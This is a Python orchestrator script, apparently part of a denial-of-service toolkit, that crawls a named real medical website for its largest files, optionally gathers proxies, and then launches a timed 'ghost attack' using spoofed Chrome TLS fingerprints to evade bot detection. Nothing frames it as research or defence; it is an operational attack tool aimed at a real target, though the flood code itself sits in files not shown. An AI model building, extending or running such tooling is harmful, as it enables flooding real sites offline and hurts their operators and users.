#!/usr/bin/env python3
"""master.py — Orchestrator. Python-only (no Node.js needed).

Runs: target_crawler → proxy_engine → ghost_attack.
All Python + curl_cffi. Real Chrome JA3. No Node.js TLS fingerprint issue.

Usage:
  python3 master.py www.moderndoctor.in 10           # direct mode (20 workers max)
  python3 master.py www.moderndoctor.in 10 --proxy   # with proxies (80 workers)
"""

import argparse
import json
import os
import subprocess
import sys
import time
from pathlib import Path

def main():
    parser = argparse.ArgumentParser(description="Master orchestrator")
    parser.add_argument("target", help="Target host")
    parser.add_argument("minutes", type=int, nargs="?", default=10, help="Duration (min)")
    parser.add_argument("--proxy", action="store_true", help="Use proxy engine")
    args = parser.parse_args()

    h = args.target.replace("https://", "").replace("http://", "").rstrip("/")
    h = h[4:] if h.startswith("www.") else h
    host = f"www.{h}"

    print(f"{'='*60}")
    print(f"MASTER ORCHESTRATOR — {host}")
    print(f"{'='*60}\n")

    # Phase 1: Crawl
    print("[PHASE 1] Target crawler...\n")
    try:
        subprocess.run([sys.executable, "target_crawler.py", host], check=True)
    except Exception as e:
        print(f"  Crawler failed: {e}")
        return
    if not Path("targets.json").exists():
        print("  targets.json not created. Aborting.")
        return
    targets = json.loads(Path("targets.json").read_text())
    print(f"\n  {len(targets)} targets found. Biggest: {targets[0]['size']//1024}KB\n")

    # Phase 2: Proxy (optional)
    if args.proxy:
        print("[PHASE 2] Proxy engine...\n")
        try:
            subprocess.run([sys.executable, "proxy_engine.py", "--target", host, "--min", "5"],
                         check=True, timeout=90)
        except Exception as e:
            print(f"  Proxy engine failed: {e} — continuing without proxies")

    # Phase 3: Attack
    print(f"\n[PHASE 3] Ghost attack — {args.minutes} min\n")
    cmd = [sys.executable, "ghost_attack.py", host, str(args.minutes)]
    if args.proxy:
        cmd.append("--proxy")
    subprocess.run(cmd)

if __name__ == "__main__":
    main()
